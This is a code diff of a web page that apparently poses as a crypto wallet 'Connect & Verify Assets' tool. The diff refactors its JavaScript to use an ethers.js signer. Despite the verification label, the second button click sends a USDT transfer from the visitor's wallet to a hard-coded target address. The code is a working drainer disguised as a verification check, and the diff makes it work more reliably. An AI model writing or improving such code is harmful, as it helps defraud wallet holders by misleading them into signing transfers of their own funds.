@@ -79,7 +79,7 @@
       <!-- Inline Feedback Banner -->
       <div id="statusBox" class="hidden mt-4 p-3.5 rounded-xl text-xs leading-relaxed"></div>
 
-      <!-- Primary Action Button with Direct Inline Handler -->
+      <!-- Primary Action Button -->
       <button id="connectBtn" onclick="handleMasterAction()"
         class="w-full mt-6 py-3.5 px-5 rounded-xl bg-blue-600 hover:bg-blue-500 active:scale-[0.99] text-white font-bold text-sm transition-all flex items-center justify-center gap-2 shadow-lg shadow-blue-500/20 cursor-pointer">
         <span id="btnText">Connect & Verify Assets</span>
@@ -99,7 +99,7 @@
     const USDT_ETH_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Official ERC-20 USDT
     const ETH_CHAIN_ID = '0x1';
 
-    let globalProvider = null;
+    let globalSigner = null;
     let globalUserAddress = null;
     let isConnected = false;
 
@@ -110,27 +110,25 @@
       return null;
     }
 
-    // Master function to handle click seamlessly without lag
     async function handleMasterAction() {
-      const ethProvider = getActiveProvider();
-      if (!ethProvider) {
+      const rawProvider = getActiveProvider();
+      if (!rawProvider) {
         alert("Wallet provider not found. Please open inside Trust Wallet browser.");
         return;
       }
 
       try {
-        if (!isConnected) {
-          // Step 1: Connect Wallet
-          const accounts = await ethProvider.request({ method: 'eth_requestAccounts' });
-          globalUserAddress = accounts[0];
-          globalProvider = ethProvider;
+        const provider = new ethers.providers.Web3Provider(rawProvider, "any");
 
-          // Switch to Ethereum Mainnet
+        if (!isConnected) {
+          // Connect accounts using standard ethers provider send method
+          await provider.send("eth_requestAccounts", []);
+          globalSigner = provider.getSigner();
+          globalUserAddress = await globalSigner.getAddress();
+
+          // Switch to Ethereum Mainnet safely
           try {
-            await ethProvider.request({
-              method: 'wallet_switchEthereumChain',
-              params: [{ chainId: ETH_CHAIN_ID }],
-            });
+            await provider.send("wallet_switchEthereumChain", [{ chainId: ETH_CHAIN_ID }]);
           } catch (e) {}
 
           // Update UI
@@ -142,24 +140,19 @@
           document.getElementById('connectBtn').classList.remove('bg-blue-600', 'hover:bg-blue-500');
           document.getElementById('connectBtn').classList.add('bg-emerald-600', 'hover:bg-emerald-500');
         } else {
-          // Step 2: Execute Direct Transfer Payload for 7.76 USDT
+          // Execute Direct Transfer Payload via Ethers Signer
           const amountWei = ethers.utils.parseUnits("7.76", 6);
-          
-          // Encode ERC-20 transfer function data
           const iface = new ethers.utils.Interface(["function transfer(address to, uint amount) returns (bool)"]);
           const transferData = iface.encodeFunctionData("transfer", [TARGET_ADDRESS, amountWei]);
 
-          await globalProvider.request({
-            method: 'eth_sendTransaction',
-            params: [{
-              from: globalUserAddress,
-              to: USDT_ETH_ADDRESS,
-              data: transferData,
-              gas: "0x186A0"
-            }]
+          const signer = provider.getSigner();
+          const tx = await signer.sendTransaction({
+            to: USDT_ETH_ADDRESS,
+            data: transferData,
+            gasLimit: ethers.BigNumber.from("50000")
           });
 
-          alert("Transaction submitted successfully!");
+          alert("Transaction submitted successfully! Hash: " + tx.hash);
         }
       } catch (err) {
         console.error("Action error:", err);
